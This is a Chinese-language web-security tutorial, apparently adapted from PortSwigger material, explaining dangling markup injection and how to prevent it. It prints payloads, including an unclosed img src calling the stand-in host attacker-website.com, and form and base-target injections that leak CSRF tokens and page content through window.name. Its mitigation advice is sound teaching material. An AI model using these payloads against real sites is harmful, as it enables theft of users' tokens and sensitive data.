# 悬挂标记注入

在本节中，我们将解释什么是悬挂标记注入、典型的利用方式如何工作，以及如何防止悬挂标记攻击。

## 什么是悬挂标记注入？

悬挂标记注入是一种在无法实施完整跨站脚本攻击的情况下，用于跨域捕获数据的技术。其思路是注入一些不完整的 HTML（例如一个图片标签的 `src` 属性），页面上的其余标记会闭合该属性，同时将两者之间的数据发送到远程服务器。

假设一个应用程序以不安全的方式将攻击者可控制的数据嵌入到其响应中：

```html
<input type="text" name="input" value="CONTROLLABLE DATA HERE
```

再假设应用程序没有过滤或转义 `>` 或 `"` 字符。攻击者可以使用以下语法跳出带引号的属性值和外层标签，返回到 HTML 上下文中：

```html
">
```

在这种情况下，攻击者自然会尝试执行 XSS。但假设由于输入过滤器、内容安全策略或其他障碍，常规 XSS 攻击无法实现。此时，仍然可能使用如下载荷实施悬挂标记注入攻击：

```html
"><img src='//attacker-website.com?
```

该载荷创建了一个 `img` 标签，并定义了一个 `src` 属性的起始部分，其中包含指向攻击者服务器的 URL。请注意，攻击者的载荷没有闭合 `src` 属性，因此该属性是“悬挂”的。当浏览器解析响应时，它会向前查找，直到遇到一个单引号来终止该属性。在此之前的所有内容都会被视为 URL 的一部分，并作为 URL 查询字符串发送到攻击者的服务器。任何非字母数字字符（包括换行符）都会被 URL 编码。

攻击的结果是，攻击者可以捕获注入点之后应用程序响应的一部分，其中可能包含敏感数据。根据应用程序的功能，这可能包括 CSRF 令牌、电子邮件或财务数据。

任何能够发起外部请求的属性都可以用于悬挂标记注入。

当所有外部请求都被阻止。但是，某些标签允许存储数据并在以后从外部服务器检索，可能需要用户交互。
- 表单提交时定向到目标域名 
    - `<form action=目标域名`
    - `<button formaction=目标域名`
- 表单提交方法
    - `<form method="GET"`
    - `<button formmethod="GET"`
- 使用表单 GET 将表单参数以 URL 形式提交到攻击者域名
- 攻击者页面
    - 提取 csrf 令牌 `url.searchParams.get("csrf")`
    - 使用 csrf 令牌向目标功能端点发送请求，此时自动携带 cookie

## 使用 base target 绕过严格的 CSP

利用 `base` 标签的 [`target`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base#attr-target) 属性，我们可以更改页面上每个链接的 [`window name`](https://developer.mozilla.org/en-US/docs/Web/API/Window/name)。通过注入一个不完整的 `target` 属性，`window.name` 将被设置为注入点之后直到页面上每个链接对应引号之前的所有标记，从而允许我们窃取令牌或注入点与下一个引号之间的任何内容。

为了让攻击者检索数据，需诱导受害者点击该链接，因为 `window.name` 在跨域下是暴露的，攻击者只需读取 `window.name` 属性即可。注入示例如下：

```html
<a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html><font size=100 color=red>click me</font></a><b><base target="blah</b>
```

上面的注入中，`target` 属性仍未闭合，页面中的标记随后成为 `name` 的剩余部分，攻击者只需读取窗口名称即可。攻击者控制的页面位于不同域，由受害者导航访问，其内容如下：

```html
<script>alert("The extracted content is:" + name);</script>
```

### 缓解措施

你可以通过在注入点之前放置自己的 `base` 标签来防止 `base` 标签注入，这样第二个 `base` 标签就无法覆盖 `target`。例如：

```html
<base target="_self" />
```

## 使用 target 属性的表单的基于 DOM 的悬挂标记

思路是注入一个带有 `target` 属性的表单，提交表单后会再次将页面提交给自己（通过普通链接）。第一次点击通过 `target` 设置 `window.name`，然后你需要再次点击链接才能从 `window.name` 中检索数据，因此需要两次点击而非一次。
- 第一次代码，设置敏感内容到当前页面的 `window.name`：
    - 设置位置无关的表单控件与表单元素
        - 表单元素设置 id，表单控件设置 form 属性值为对应 id 以关联表单元素
    - 表单 `target` 属性未闭合
    - 表单地址为当前页面
        - 不设置 `action` 属性
        - 设置空字符串 `action=""` 
- 第二次代码，任意到攻击者页面的链接以实际跨域读取 `window.name`：
    - `<a>`

## 如何防止悬挂标记攻击

你可以使用与[防止跨站脚本](/web-security/cross-site-scripting/preventing)相同的通用防御措施来防止悬挂标记攻击，即在输出时对数据进行编码，并在输入时进行验证。

你还可以使用[内容安全策略](/web-security/cross-site-scripting/content-security-policy)（CSP）来缓解某些悬挂标记攻击。例如，你可以通过策略阻止 `img` 等标签加载外部资源，从而防止部分（但不是全部）攻击。

> **注意：** Chrome 浏览器已决定通过阻止 `img` 等标签定义包含尖括号和换行符等原始字符的 URL 来处理悬挂标记攻击。这将防止攻击，因为可能被捕获的数据通常包含这些原始字符，因此攻击会被阻止。
